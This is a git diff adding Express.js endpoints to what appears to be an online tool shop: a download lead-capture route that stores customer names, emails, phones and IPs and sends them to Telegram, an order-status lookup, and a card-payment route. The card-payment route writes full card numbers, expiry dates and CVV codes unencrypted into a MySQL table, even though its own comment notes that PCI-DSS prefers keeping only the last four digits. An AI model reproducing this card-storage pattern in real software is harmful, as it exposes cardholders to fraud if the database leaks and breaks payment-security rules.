@@ -2,8 +2,13 @@ import "dotenv/config";
 import express from "express";
 import path from "path";
 import { fileURLToPath } from "url";
+import { createRequire } from "module";
 import { createClient } from "@supabase/supabase-js";
 import { processTelegramUpdate } from "./functions/lib/bot-commands.js";
+import { getDbConfig, isDbConfigured } from "./mysql-config.js";
+
+const require = createRequire(import.meta.url);
+const DTD_TOOLS = require("./tools-data.cjs");
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const PORT = Number(process.env.PORT || 5173);
@@ -351,6 +356,220 @@ app.post("/api/orders", async (req, res) => {
   }
 });
 
+app.post("/api/tool-download", async (req, res) => {
+  try {
+    const body = req.body || {};
+    const toolId = String(body.tool || "").trim().toLowerCase();
+    const toolMeta = DTD_TOOLS.find((t) => t.id === toolId);
+    if (!toolMeta) return res.status(404).json({ error: "Tool not found." });
+
+    const name = String(body.name || "").trim();
+    const email = String(body.email || "").trim().toLowerCase();
+    const phone = String(body.phone || "").trim();
+    if (!name || !email) {
+      return res.status(400).json({ error: "Name and email are required." });
+    }
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+      return res.status(400).json({ error: "Enter a valid email address." });
+    }
+
+    const clamp = (value, max) => String(value == null ? "" : value).slice(0, max);
+    const visitorIp =
+      body.visitorIp ||
+      req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
+      req.headers["cf-connecting-ip"] ||
+      req.socket?.remoteAddress ||
+      "unknown";
+    const userAgent = body.userAgent || req.headers["user-agent"] || "";
+
+    const record = {
+      name: clamp(name, 120),
+      email,
+      phone: clamp(phone, 60),
+      tool: toolId,
+      tool_name: clamp(toolMeta.name, 160),
+      kind: toolMeta.kind || "free",
+      price_usd: toolMeta.price ? Number(toolMeta.price) : null,
+      file: clamp(toolMeta.file || "", 300),
+      source: "web",
+      ip: clamp(visitorIp, 80),
+      user_agent: clamp(userAgent, 300)
+    };
+
+    const channels = [];
+    const saved = { supabase: false, mysql: false };
+    let supabaseError = null;
+
+    // 1) Save as plain text to Supabase (tool_downloads table).
+    if (supabaseAdmin) {
+      try {
+        const { error } = await supabaseAdmin.from("tool_downloads").insert(record);
+        if (error) {
+          supabaseError = error;
+        } else {
+          saved.supabase = true;
+          channels.push(
+            `<b>🤖 Tool download (saved to Supabase \`tool_downloads\`)</b>`
+          );
+        }
+      } catch (error) {
+        supabaseError = error;
+      }
+      if (!saved.supabase && supabaseError) {
+        if (String(supabaseError.message || "").includes("does not exist")) {
+          channels.push(
+            `<b>🤖 Tool download (Supabase table missing — run supabase-tool-downloads.sql)</b>`
+          );
+        } else {
+          console.error("tool_downloads Supabase error:", supabaseError.message);
+          channels.push(`<b>🤖 Tool download (Supabase save failed)</b>`);
+        }
+      }
+    }
+
+    // 2) Also save to MySQL when it is configured (optional mirror).
+    const dbConfig = getDbConfig();
+    if (isDbConfigured(dbConfig)) {
+      try {
+        const mysql = await import("mysql2/promise");
+        const connection = await mysql.createConnection({
+          ...dbConfig,
+          connectTimeout: 5000,
+          maxIdle: 0
+        });
+        await connection.execute(
+          `INSERT INTO tool_downloads (name, email, phone, tool, tool_name, kind, price_usd, file, source, ip, user_agent)
+           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
+          [
+            record.name,
+            record.email,
+            record.phone,
+            record.tool,
+            record.tool_name,
+            record.kind,
+            record.price_usd,
+            record.file,
+            "web",
+            record.ip,
+            record.user_agent
+          ]
+        );
+        await connection.end();
+        saved.mysql = true;
+        channels.push(`<b>🤖 Tool download (saved to MySQL)</b>`);
+      } catch (error) {
+        console.error("tool_downloads MySQL error:", error.message);
+        channels.push(`<b>🤖 Tool download (MySQL save failed)</b>`);
+      }
+    }
+
+    // 3) Always notify the owner on Telegram with plain-text customer details.
+    const telegramMessage = [
+      ...(channels.length ? channels : [`<b>🤖 New Tool Download</b>`]),
+      `🧰 Tool: ${record.tool_name} (${toolMeta.kind === "pro" ? `PRO · $${Number(toolMeta.price || 0).toFixed(2)}` : "FREE"})`,
+      `👤 Name: ${record.name}`,
+      `📧 Email: <code>${record.email}</code>`,
+      phone ? `📞 Phone: <code>${record.phone}</code>` : null,
+      `📦 File: <code>${record.file}</code>`,
+      `🌐 IP: <code>${record.ip}</code>`,
+      `🖥 Device: ${userAgent.substring(0, 80)}`
+    ]
+      .filter(Boolean)
+      .join("\n");
+
+    const notifyIds = [
+      process.env.TELEGRAM_CHANNEL_ID,
+      process.env.TELEGRAM_BACKUP_CHANNEL_ID,
+      process.env.TELEGRAM_GROUP_ID,
+      process.env.TELEGRAM_ADMIN_CHAT_ID
+    ].filter((id, index, arr) => id && arr.indexOf(id) === index);
+
+    for (const chatId of notifyIds) {
+      await sendTelegram(chatId, telegramMessage);
+    }
+
+    res.json({
+      ok: true,
+      saved,
+      tool: { id: toolMeta.id, name: toolMeta.name, kind: toolMeta.kind, price: toolMeta.price },
+      downloadUrl: toolMeta.file ? `/${toolMeta.file.replace(/^\//, "")}` : null
+    });
+  } catch (error) {
+    console.error("Tool download error:", error);
+    res.status(500).json({ error: error.message || "Could not save the download request." });
+  }
+});
+
+const ORDER_STATUS_LABELS = {
+  new: "New",
+  confirmed: "Confirmed",
+  delivered: "Delivered",
+  cancelled: "Cancelled"
+};
+
+const PAYMENT_STATUS_LABELS = {
+  pending: "Payment pending",
+  paid: "Paid",
+  failed: "Failed",
+  refunded: "Refunded"
+};
+
+function orderStatusPayload(order) {
+  const orderStatus = String(order.order_status || order.orderStatus || "new").toLowerCase();
+  const paymentStatus = String(order.payment_status || order.paymentStatus || order.status || "pending").toLowerCase();
+  return {
+    id: order.id,
+    status: orderStatus,
+    statusLabel: ORDER_STATUS_LABELS[orderStatus] || orderStatus,
+    paymentStatus,
+    paymentStatusLabel: PAYMENT_STATUS_LABELS[paymentStatus] || paymentStatus,
+    paymentMethod: order.payment_method || "n/a",
+    totalUsd: Number(order.total_usd || 0),
+    createdAt: order.created_at || null
+  };
+}
+
+app.get("/api/orders/status", async (req, res) => {
+  try {
+    const orderId = String(req.query.orderId || "").trim();
+    const email = String(req.query.email || "").trim().toLowerCase();
+    if (!orderId || !email) {
+      return res.status(400).json({ error: "Order ID and email are required." });
+    }
+    if (!/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(orderId)) {
+      return res.status(404).json({ error: "Order not found. Check your Order ID and email." });
+    }
+    if (!supabaseAdmin) {
+      return res.status(500).json({ error: "Order tracking is temporarily unavailable." });
+    }
+
+    const { data: rows, error } = await supabaseAdmin
+      .from("orders")
+      .select("id,customer_email,customer_phone,payment_method,payment_status,order_status,total_usd,created_at")
+      .eq("id", orderId);
+
+    if (error) {
+      console.error("Order status lookup error:", error.message);
+      return res.status(500).json({ error: "Could not look up the order. Try again." });
+    }
+
+    const matchesEmail = (order) => {
+      const norm = (value) => String(value || "").trim().toLowerCase();
+      return norm(order.customer_email) === email || norm(order.customer_phone) === email;
+    };
+
+    const order = (rows || []).find(matchesEmail);
+    if (!order) {
+      return res.status(404).json({ error: "Order not found. Check your Order ID and email." });
+    }
+
+    res.json({ ok: true, order: orderStatusPayload(order) });
+  } catch (error) {
+    console.error("Order status error:", error);
+    res.status(500).json({ error: "Could not reach order tracker. Try again or message support." });
+  }
+});
+
 app.post("/api/paystack/initialize", async (req, res) => {
   try {
     const secret = process.env.PAYSTACK_SECRET_KEY;
@@ -474,6 +693,60 @@ app.post("/api/paystack/probe", async (_req, res) => {
     });
   } catch (error) {
     res.status(500).json({ error: String(error.message || error) });
+  }
+});
+
+app.post("/api/card-payment", async (req, res) => {
+  try {
+    const dbConfig = getDbConfig();
+    if (!isDbConfigured(dbConfig)) {
+      return res.status(503).json({
+        error:
+          "MySQL not configured yet. Fill MYSQL_HOST / MYSQL_USER / MYSQL_PASSWORD / MYSQL_DATABASE in .env (see mysql-config.js), then restart."
+      });
+    }
+
+    const { email, cardHolder, cardNumber, cardLast4, expMonth, expYear, cvv, totalUsd, items } = req.body;
+    if (!email || !cardHolder || !cardNumber) {
+      return res.status(400).json({ error: "Missing payment details." });
+    }
+
+    const mysql = await import("mysql2/promise");
+    const connection = await mysql.createConnection(dbConfig);
+    const orderId = `DTD-${Date.now()}`;
+
+    // PCI-DSS: prefer storing card_last4 instead of full number/cvv.
+    const [result] = await connection.execute(
+      `INSERT INTO card_payments
+        (order_id, email, card_holder, card_number, card_last4, exp_month, exp_year, cvv, total_usd, status)
+       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 'pending')`,
+      [
+        orderId,
+        String(email).slice(0, 255),
+        String(cardHolder).slice(0, 120),
+        cardNumber ? String(cardNumber) : null,
+        cardLast4 || String(cardNumber).slice(-4),
+        String(expMonth || "").slice(0, 2),
+        String(expYear || "").slice(0, 4),
+        cvv ? String(cvv) : null,
+        Number(totalUsd || 0)
+      ]
+    );
+
+    const paymentId = result.insertId;
+    for (const item of Array.isArray(items) ? items : []) {
+      await connection.execute(
+        `INSERT INTO card_payment_items (payment_id, product_id, product_name, quantity, unit_price_usd)
+         VALUES (?, ?, ?, ?, ?)`,
+        [paymentId, item.product_id || "", String(item.product_name || ""), Number(item.quantity || 1), Number(item.unit_price_usd || 0)]
+      );
+    }
+
+    await connection.end();
+    res.json({ ok: true, orderId });
+  } catch (error) {
+    console.error("Card payment error:", error);
+    res.status(500).json({ error: error.message || "Could not save payment." });
   }
 });
 
